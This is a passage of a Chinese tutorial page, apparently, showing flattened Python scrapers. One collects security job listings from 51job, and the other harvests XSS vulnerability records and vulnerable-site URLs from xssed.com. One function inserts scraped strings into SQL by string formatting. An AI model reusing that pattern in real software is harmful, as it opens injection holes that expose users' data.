class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、-爬取51job网站"><a href="#二、-爬取51job网站" class="headerlink" title="二、 爬取51job网站"></a>二、 爬取51job网站</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup       <span class="token comment" spellcheck="true">#解析页面，获取数据</span><span class="token keyword">import</span> re                           <span class="token comment" spellcheck="true">#正则表达式，进行文字匹配</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>error  <span class="token comment" spellcheck="true">#指定URL，获取页面数据</span><span class="token keyword">import</span> xlwt                         <span class="token comment" spellcheck="true">#进行excel操作</span><span class="token keyword">import</span> sqlite3                      <span class="token comment" spellcheck="true">#数据库</span><span class="token keyword">import</span> json<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token comment" spellcheck="true">#1.爬取网页</span><span class="token comment" spellcheck="true">#2.解析数据</span><span class="token comment" spellcheck="true">#3.保存数据</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl1 <span class="token operator">=</span> <span class="token string">"https://search.51job.com/list/030200,000000,0000,00,9,99,%25E7%25BD%2591%25E7%25BB%259C%25E5%25AE%2589%25E5%2585%25A8,2,"</span>    baseurl2 <span class="token operator">=</span> <span class="token string">".html"</span>    dataList <span class="token operator">=</span> getData<span class="token punctuation">(</span>baseurl1<span class="token punctuation">,</span>baseurl2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># savepath = ".\\网安工作.xls"</span>    <span class="token comment" spellcheck="true"># saveData(dataList,savepath)</span>    dbpath <span class="token operator">=</span> <span class="token string">"wangan.db"</span>    saveData2DB<span class="token punctuation">(</span>dataList<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1.爬取网页</span><span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl1<span class="token punctuation">,</span>baseurl2<span class="token punctuation">)</span><span class="token punctuation">:</span>    dataList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        page <span class="token operator">=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        url <span class="token operator">=</span> baseurl1 <span class="token operator">+</span> page <span class="token operator">+</span> baseurl2        html <span class="token operator">=</span> askURL<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(html)</span>        newhtml <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>html<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#化为字典</span>        <span class="token comment" spellcheck="true"># print(newhtml)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>newhtml<span class="token punctuation">[</span><span class="token string">'engine_search_result'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            key <span class="token operator">=</span> newhtml<span class="token punctuation">[</span><span class="token string">'engine_search_result'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>            <span class="token comment" spellcheck="true">#职位名称</span>            job_name <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'job_name'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>job_name<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 职位链接</span>            job_href <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'job_href'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>job_href<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(job_href)</span>            <span class="token comment" spellcheck="true">#关键词</span>            attribute_text <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'attribute_text'</span><span class="token punctuation">]</span>            keyword <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> attribute_text<span class="token punctuation">:</span>                keyword <span class="token operator">=</span> keyword <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> m            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 工资待遇</span>            providesalary_text <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'providesalary_text'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>providesalary_text<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 工作福利</span>            jobwelf <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'jobwelf'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>jobwelf<span class="token punctuation">)</span>            jobhtml <span class="token operator">=</span> askURL2<span class="token punctuation">(</span>job_href<span class="token punctuation">)</span>            <span class="token keyword">if</span> jobhtml<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token comment" spellcheck="true"># print(jobhtml)</span>            <span class="token comment" spellcheck="true"># 职位详情</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                jobmessage <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>jobhtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[3]/div[2]/div[3]/div[1]/div//p/text()'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token comment" spellcheck="true"># print(jobmessage)</span>            jobmessage1 <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> jobmessage<span class="token punctuation">:</span>                jobmessage1 <span class="token operator">=</span> jobmessage1 <span class="token operator">+</span> k <span class="token operator">+</span> <span class="token string">'\n'</span>            jobmessage1 <span class="token operator">=</span> jobmessage1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\xa0'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> jobmessage1 <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>jobmessage1<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 工作地址</span>            jobadress <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>jobhtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[3]/div[2]/div[3]/div[2]/div//p/text()'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(jobadress)</span>            <span class="token keyword">if</span> jobadress <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>jobadress<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 公司名称</span>            company_name <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'company_name'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>company_name<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#公司类型</span>            companytype_text <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'companytype_text'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>companytype_text<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#公司规模</span>            companysize_text <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'companysize_text'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>companysize_text<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#公司链接</span>            company_href <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'company_href'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>company_href<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#更新时间</span>            updatedate <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token string">'updatedate'</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>updatedate<span class="token punctuation">)</span>            dataList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爬取第%d页第%d条"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(dataList)</span>            <span class="token comment" spellcheck="true"># break</span>    <span class="token keyword">return</span> dataList<span class="token keyword">def</span> <span class="token function">askURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># 模拟浏览器头部信息，向豆瓣服务器发送消息</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"</span>    <span class="token punctuation">}</span>    request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html <span class="token operator">=</span> <span class="token string">""</span>    newhtml <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(html)</span>        tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'window.__SEARCH_RESULT__ = (.*?)&lt;/script>'</span><span class="token punctuation">)</span>        newhtml <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>tmp<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>    <span class="token keyword">return</span> newhtml<span class="token keyword">def</span> <span class="token function">askURL2</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># 模拟浏览器头部信息，向豆瓣服务器发送消息</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"</span>    <span class="token punctuation">}</span>    request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    book <span class="token operator">=</span> xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    sheet <span class="token operator">=</span> book<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'网安'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">#可重复对一个单元格进行操作</span>    col <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"职位名称"</span><span class="token punctuation">,</span><span class="token string">"职位链接"</span><span class="token punctuation">,</span><span class="token string">"关键词"</span><span class="token punctuation">,</span><span class="token string">"工资待遇"</span><span class="token punctuation">,</span><span class="token string">"工作福利"</span><span class="token punctuation">,</span><span class="token string">"职位详情"</span><span class="token punctuation">,</span><span class="token string">"工作地址"</span><span class="token punctuation">,</span><span class="token string">"公司名称"</span><span class="token punctuation">,</span><span class="token string">"公司类型"</span><span class="token punctuation">,</span><span class="token string">"公司规模"</span><span class="token punctuation">,</span><span class="token string">"公司链接"</span><span class="token punctuation">,</span><span class="token string">"更新时间"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1440</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"保存第%d条"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> datalist<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    book<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">saveData2DB</span><span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#连接数据库</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">#建立数据库</span>    i <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> datalist<span class="token punctuation">:</span>        sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''                insert into wangan(                job_name,job_href,attribute_text,providesalary_text,jobwelf,jobmessage,jobadress,company_name,companytype_text,companysize_text,company_href,updatedate)                values(%s);'''</span><span class="token operator">%</span><span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'\"%s\"'</span> <span class="token operator">%</span>id <span class="token keyword">for</span> id <span class="token keyword">in</span> data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"保存第%d条数据"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''        create table wangan        (        id integer primary key autoincrement,        job_name varchar,        job_href text,        attribute_text text,         providesalary_text varchar,        jobwelf varchar,        jobmessage varchar,        jobadress text,        company_name varchar,        companytype_text varchar,        companysize_text varchar,        company_href text,        updatedate text        )    '''</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#调用函数</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爬取完毕！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、-爬取xssed网站中的漏洞信息"><a href="#三、-爬取xssed网站中的漏洞信息" class="headerlink" title="三、 爬取xssed网站中的漏洞信息"></a>三、 爬取xssed网站中的漏洞信息</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup  <span class="token comment" spellcheck="true"># 页面解析，获取数据</span><span class="token keyword">import</span> re  <span class="token comment" spellcheck="true"># 正则表达式，进行文字匹配</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>error  <span class="token comment" spellcheck="true"># 指定URL，获取网页数据</span><span class="token keyword">import</span> xlwt  <span class="token comment" spellcheck="true"># 进行excel操作</span><span class="token keyword">import</span> sqlite3  <span class="token comment" spellcheck="true"># 进行SQLLi</span><span class="token keyword">import</span> json<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token comment" spellcheck="true">#爬取网页</span><span class="token comment" spellcheck="true">#解析数据</span><span class="token comment" spellcheck="true">#保存数据</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl <span class="token operator">=</span> <span class="token string">"http://www.xssed.com/archive/page="</span>    datalist <span class="token operator">=</span> getData<span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span>    dbpath <span class="token operator">=</span> <span class="token string">"BDAI.db"</span>    savepath <span class="token operator">=</span> <span class="token string">".\\BDAI.xls"</span>    saveData<span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#爬取网页、解析数据</span><span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    datalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        html <span class="token operator">=</span> askUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(html)</span>        mirror <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爬取第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                m <span class="token operator">=</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                mirrorHref <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="tableborder"]/table/tr['</span><span class="token operator">+</span>m<span class="token operator">+</span><span class="token string">']/th[9]/a/@href'</span><span class="token punctuation">)</span>                mirror<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mirrorHref<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># print(mirrorHref)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token comment" spellcheck="true"># print(mirror)</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># print(mirror[k][0])</span>            data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            newUrl <span class="token operator">=</span> <span class="token string">"http://www.xssed.com"</span><span class="token operator">+</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>mirror<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            newHtml <span class="token operator">=</span> askUrl<span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(newHtml)</span>            Datesubmitted <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>newHtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="contentpaneOpen"]/table/div[2]/tr/th[1]//text()'</span><span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Datesubmitted<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            Datepublished <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>newHtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="contentpaneOpen"]/table/div[2]/tr/th[2]//text()'</span><span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Datepublished<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            Author <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>newHtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="contentpaneOpen"]/table/div[3]/tr/th[1]/a//text()'</span><span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Author<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            Domain <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>newHtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="contentpaneOpen"]/table/div[3]/tr/th[2]//text()'</span><span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Domain<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            Pagerank <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>newHtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="contentpaneOpen"]/table/div[3]/tr/th[4]//text()'</span><span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Pagerank<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            URL <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>newHtml<span class="token punctuation">)</span><span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="contentpaneOpen"]/table/div[4]/tr/th//text()'</span><span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(data)</span>            datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token 